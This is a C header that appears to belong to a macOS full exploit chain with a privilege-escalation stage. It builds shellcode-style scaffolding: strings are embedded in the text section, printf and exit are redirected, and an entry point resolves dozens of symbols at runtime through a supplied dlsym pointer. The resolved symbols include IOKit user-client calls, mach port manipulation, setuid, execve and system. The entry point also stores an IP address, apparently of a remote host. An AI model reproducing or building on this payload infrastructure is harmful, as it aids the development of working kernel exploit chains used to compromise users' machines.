#ifndef __FULLCHAIN_H__
#define __FULLCHAIN_H__

#include <dlfcn.h>

#define GLOB __attribute__((section("__TEXT, __text")))

#define CSTR(x) ({\
        static GLOB char tempstr[] = x;\
        tempstr;\
        })

#define printf(fmt, ...) dprintf(log_fd, CSTR(fmt), ##__VA_ARGS__)
#define exit(val) do {sleep(120);} while(1);

#undef memcpy
#undef memset
#undef memmove
#undef sprintf
#undef strcpy

#define kIOMasterPortDefault 0
#define kCFAllocatorDefault 0

// mach_task_self_ is an exported global that caches the current task port
#undef mach_task_self
#define mach_task_self() (*(mach_port_t*)(mach_task_self_))

#define FOR_EACH_IMPFUNC(v) \
    v(int, dprintf, int, char*, ...)\
    v(int, close, int)\
    v(int, sleep, int)\
    v(ssize_t, writev, int, struct iovec*, int)\
    v(ssize_t, write, int, void*, size_t)\
    v(int, usleep, useconds_t)\
    v(time_t, time, time_t*)\
    v(int, strcmp, char*, char*)\
    v(int, socketpair, int, int, int, int[2])\
    v(sig_t, signal, int, sig_t)\
    v(int, setrlimit, int, struct rlimit*)\
    v(ssize_t, read, int, void*, size_t)\
    v(int, pthread_kill, pthread_t, int)\
    v(int, pthread_join, pthread_t, void**)\
    v(void, pthread_exit, void*)\
    v(int, pthread_create, pthread_t*, pthread_attr_t*, void*(*)(void*), void*)\
    v(int, open, char*, int, ...)\
    v(void*, mmap, void*, size_t, int, int, int, off_t)\
    v(void*, memmem, void*, size_t, void*, size_t)\
    v(void*, memset, void*, int, size_t)\
    v(void*, malloc, size_t)\
    v(void, mach_task_self_)\
    v(kern_return_t, mach_port_set_context, ipc_space_t, mach_port_name_t, mach_vm_address_t)\
    v(kern_return_t, mach_port_get_attributes, ipc_space_t, mach_port_name_t, mach_port_flavor_t, mach_port_info_t, mach_msg_type_number_t*)\
    v(kern_return_t, mach_port_allocate, ipc_space_t, mach_port_right_t, mach_port_name_t*)\
    v(kern_return_t, mach_msg, mach_msg_header_t*, mach_msg_option_t, mach_msg_size_t, mach_msg_size_t, mach_port_name_t, mach_msg_timeout_t, mach_port_name_t)\
    v(off_t, lseek, int, off_t, int)\
    v(kern_return_t, IOServiceOpen, io_service_t, task_port_t, uint32_t, io_connect_t*)\
    v(CFMutableDictionaryRef, IOServiceNameMatching, char*)\
    v(io_service_t, IOServiceGetMatchingService, mach_port_t, CFDictionaryRef)\
    v(kern_return_t, IOServiceClose, io_connect_t)\
    v(kern_return_t, IOConnectMapMemory, io_connect_t, uint32_t, task_port_t, mach_vm_address_t*, mach_vm_size_t*, IOOptionBits)\
    v(kern_return_t, IOConnectCallStructMethod, mach_port_t, uint32_t, void*, size_t, void*, size_t*)\
    v(kern_return_t, IOConnectCallScalarMethod, mach_port_t, uint32_t, uint64_t*, uint32_t, uint64_t*, uint32_t*)\
    v(kern_return_t, IOConnectAddClient, io_connect_t, io_connect_t)\
    v(int*, __error)\
    v(int, fcntl, int, int, ...)\
    v(int, pipe, int[2])\
    v(int, sched_yield)\
    v(int, sprintf, char*, char*, ...)\
    v(int, sysctlbyname, char*, void*, size_t*, void*, size_t)\
    v(int, setuid, uid_t)\
    v(int, execve, char*, char**, char**)\
    v(int, system, char*)\
    v(kern_return_t, IOConnectCallMethod, mach_port_t, uint32_t, uint64_t*, uint32_t, void*, size_t, uint64_t*, uint32_t*, void*, size_t*)\
    v(void, free, void*)\
    v(int, ioctl, int, unsigned long, ...)\
    v(kern_return_t, mach_port_destroy, ipc_space_t, mach_port_name_t)\
    v(kern_return_t, mach_port_peek, ipc_space_t, mach_port_name_t, mach_msg_trailer_type_t, mach_port_seqno_t*, mach_msg_size_t*, mach_msg_id_t*, mach_msg_trailer_info_t, mach_msg_type_number_t*)\
    v(kern_return_t, mach_port_set_attributes, ipc_space_t, mach_port_name_t, mach_port_flavor_t, mach_port_info_t, mach_msg_type_number_t)\
    v(kern_return_t, mach_port_set_seqno, ipc_space_t, mach_port_name_t, mach_port_seqno_t)\
    v(void*, memchr, void*, int, size_t)\
    v(char*, strcpy, char*, char*)\
    v(size_t, strlen, char*)\
    v(int, munmap, void*, size_t)\
    v(int, setjmp, jmp_buf)\
    v(void, longjmp, jmp_buf, int)\
    v(kern_return_t, IOObjectRelease, io_object_t)\
    v(kern_return_t, IOConnectCallAsyncScalarMethod, mach_port_t, uint32_t, mach_port_t, uint64_t*, uint32_t, uint64_t*, uint32_t, uint64_t*, uint32_t*)\
    v(IONotificationPortRef, IONotificationPortCreate, mach_port_t)\
    v(mach_port_t, IONotificationPortGetMachPort, IONotificationPortRef)\
    v(void*, memcpy, void*, void*, size_t)\
    v(kern_return_t, task_generate_corpse, ipc_space_t, mach_port_t*)\
    v(void, IONotificationPortDestroy, IONotificationPortRef)\
    v(CFTypeID, CFGetTypeID, CFTypeRef)\
    v(CFTypeID, CFStringGetTypeID)\
    v(int, CFStringGetCString, CFStringRef, char*, CFIndex, CFStringEncoding)\
    v(CFTypeRef, IORegistryEntryCreateCFProperty, io_registry_entry_t, CFStringRef, CFAllocatorRef, IOOptionBits)\
    v(CFStringRef, CFStringCreateWithCString, CFAllocatorRef, char*, CFStringEncoding)\
    v(void, CFRelease, CFTypeRef)\
    v(int, i386_set_ldt, int, void*, int)\
    v(kern_return_t, mach_port_insert_right, ipc_space_t, mach_port_t, mach_port_t, mach_msg_type_name_t)\
    v(mach_port_t, mach_thread_self)\
    v(int, pthread_detach, pthread_t)\
    v(kern_return_t, thread_set_exception_ports, thread_act_t, exception_mask_t, mach_port_t, exception_behavior_t, thread_state_flavor_t)

// only one of eop.c and eop_common.c can define these globals, little hacky
#ifdef FULLCHAIN
#define QUALIFIER extern
#else
#define QUALIFIER GLOB
#endif
#define IMPENT_DEF(ret, sym, ...) \
    QUALIFIER ret (*__imp_##sym)(__VA_ARGS__);
FOR_EACH_IMPFUNC(IMPENT_DEF);
#undef IMPENT_DEF

#define IMPDEF(un, sym, ...) __NLHASH__define sym __imp_##sym
FOR_EACH_IMPFUNC(IMPDEF)
#undef IMPDEF

#ifndef FULLCHAIN
GLOB int log_fd;
GLOB unsigned char ipaddr[4];

void _start();

// this must be first func to resolve symbols
void __entry(void* (*dlsym)(void*, char*), int __log_fd, unsigned int ip) {
#define IMP_RESOLVE(ret, sym, ...)\
    __imp_##sym = dlsym(RTLD_DEFAULT, CSTR(#sym));\
    if (!__imp_##sym) {\
        printf("couldnt resolve symbol: %s\n", CSTR(#sym));\
        exit(1);\
    }
    FOR_EACH_IMPFUNC(IMP_RESOLVE);
#undef IMP_RESOLVE
    log_fd = __log_fd;
    *(unsigned int*)&ipaddr[0] = ip;
    _start();
    close(log_fd);

    // yeah...
    while(1)
        sleep(120);
}

// compiler emits these for certain code constructs
void __bzero(void* p, size_t sz) {
    memset(p, 0, sz);
}
void ___chkstk_darwin() {
}
#else
extern int log_fd;
#endif

#endif
